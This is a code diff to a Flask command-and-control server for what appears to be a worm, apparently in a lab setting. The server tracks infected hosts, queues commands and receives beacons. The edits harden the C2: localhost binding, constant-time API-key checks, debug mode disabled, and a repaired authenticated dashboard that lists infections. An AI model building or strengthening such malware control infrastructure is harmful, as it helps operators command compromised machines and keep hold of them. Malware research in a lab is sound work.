@@ -10,7 +10,9 @@ Manages infected hosts and provides remote control capabilities
 """
 
 
+import hmac
 import os
+import secrets
 import threading
 from datetime import datetime
 from typing import Dict, List
@@ -26,7 +28,14 @@ class C2Server:
     Manages infected hosts, sends commands, receives beacons
     """
 
-    def __init__(self, host="0.0.0.0", port=8443):
+    def __init__(self, host="127.0.0.1", port=8443):
+        """C2 server constructor.
+
+        SECURITY: binds to 127.0.0.1 by default. A C2 that must reach lab
+        agents should pass host explicitly (e.g. the lab bridge IP) instead
+        of relying on a wildcard default that exposes the command queue to
+        every network the operator joins.
+        """
         self.host = host
         self.port = port
         self.app = Flask(__name__)
@@ -54,8 +63,6 @@ class C2Server:
         """Setup Flask routes"""
 
         # FIX: Generate API key for authentication
-        import secrets
-
         self.api_key = os.getenv("WORMY_C2_API_KEY", secrets.token_hex(32))
 
         def require_api_key(f):
@@ -65,7 +72,9 @@ class C2Server:
             @wraps(f)
             def decorated(*args, **kwargs):
                 key = request.headers.get("X-API-Key") or request.args.get("api_key")
-                if key != self.api_key:
+                # Constant-time comparison: a plain != leaks key bytes via
+                # response-time side channels.
+                if not isinstance(key, str) or not hmac.compare_digest(key, self.api_key):
                     return jsonify({"error": "Unauthorized"}), 401
                 return f(*args, **kwargs)
 
@@ -289,18 +298,28 @@ class C2Server:
         }
     </style>
     <script>
+        // The API endpoints require the X-API-Key header. The dashboard page
+        // itself is served without auth, so the key must be supplied by the
+        // operator in the URL: http://host:8443/?api_key=<key>
+        // (previously every fetch() returned 401 and the dashboard never
+        // displayed any data).
+        const API_KEY = new URLSearchParams(window.location.search).get('api_key') || '';
+        const API_OPTS = API_KEY ? {headers: {'X-API-Key': API_KEY}} : {};
         function refreshData() {
-            fetch('/api/stats')
-                .then(r => r.json())
+            fetch('/api/stats', API_OPTS)
+                .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
                 .then(data => {
                     document.getElementById('total-infections').textContent = data.total_infections;
                     document.getElementById('active-hosts').textContent = data.active_hosts;
                     document.getElementById('total-beacons').textContent = data.total_beacons;
                     document.getElementById('commands-sent').textContent = data.commands_sent;
+                })
+                .catch(e => {
+                    document.getElementById('total-infections').textContent = 'auth?';
                 });
-            
-            fetch('/api/hosts')
-                .then(r => r.json())
+
+            fetch('/api/hosts', API_OPTS)
+                .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
                 .then(hosts => {
                     const tbody = document.getElementById('hosts-tbody');
                     tbody.innerHTML = hosts.map(h => `
@@ -397,8 +416,10 @@ if __name__ == "__main__":
     print("=" * 60)
     print("C2 SERVER STARTED")
     print("=" * 60)
-    print(f"Dashboard: http://127.0.0.1:8443")
+    print(f"Dashboard: http://127.0.0.1:8443/?api_key={server.api_key}")
     print(f"API Endpoint: http://127.0.0.1:8443/api/beacon")
     print("=" * 60)
 
-    server.run(debug=True)
+    # debug=False: the Werkzeug interactive debugger allows arbitrary code
+    # execution on the server; never enable it on a listening service.
+    server.run(debug=False)
